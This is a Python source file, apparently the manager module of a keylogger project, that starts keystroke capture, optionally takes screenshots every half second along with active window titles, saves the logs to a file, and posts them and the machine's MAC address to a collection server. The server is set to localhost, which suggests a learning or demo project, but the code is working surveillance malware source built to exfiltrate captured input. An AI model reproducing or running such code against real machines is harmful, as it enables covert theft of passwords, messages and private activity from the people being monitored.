import pygetwindow
import requests
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt
from Network_Writer import NetworkWrite
from Write_to_file import FileWriter
from KeyLogger_Service import KeyloggerService

import os
import threading
import time
import keyboard




class KeyLoggerManager:
    def __init__(self, server_link, if_screenshot=True, file_write=True):
        self.server_link = server_link
        self.__if_screenshot = if_screenshot
        self.file_write = file_write
        self.network_write = not file_write
        self.__instance = KeyloggerService(if_screenshot)

        requests.post(server_link+'/send_mac', data=get_mac_address())





    def start(self):
        self.__instance._start()

    def __thread_take_shot(self):
        while self.__instance.action:
            try:
                self.__instance._take_shot()
            except Exception as e:
                self.__instance._KeyloggerService__add_to_data(self.__instance.data, ('error in:',pygetwindow.getActiveWindowTitle(),'exception:',e))
            time.sleep(0.5)

    def __write_file(self):
        time.sleep(0.1)
        file_writer = FileWriter()
        while self.__instance.action:
            if self.__instance._KeyloggerService__data:
                try:
                    file_writer.write_to_file(self.__instance.data)
                except Exception as e:
                    self.__instance._KeyloggerService__add_to_data(self.__instance.data, e)
            time.sleep(8)
        file_writer.write_to_file(self.__instance.data)
        net_writer = NetworkWrite(self.server_link+'/add_data')
        with open(file_writer.file_path, 'r') as f:
            net_writer.write_to_server(f.read())
        # os.remove(r"C:\Users\Public\tmp.json")

    def write_server(self):
        writer = NetworkWrite(self.server_link+'/add_data')
        while self.__instance.action:
            if self.__instance._KeyloggerService__data:
                print('server write')
                writer.write_to_server(self.__instance.data)
            time.sleep(5)
        writer.write_to_server(self.__instance.data)


    def main(self):
        threading.Thread(target=self.start).start()
        if self.network_write:
            threading.Thread(target=self.write_server).start()
        if self.file_write:
            threading.Thread(target=self.__write_file).start()
        if self.__if_screenshot:
            threading.Thread(target=self.__thread_take_shot).start()
        while self.__instance.action:
            self.stop()
            time.sleep(0.1)


    def stop(self):
        if keyboard.is_pressed('shift+q'):
            self.__instance._KeyloggerService__change_action()


server_link = "http://127.0.0.1:5000"
KeyLoggerManager(server_link, if_screenshot=False, file_write=False).main()
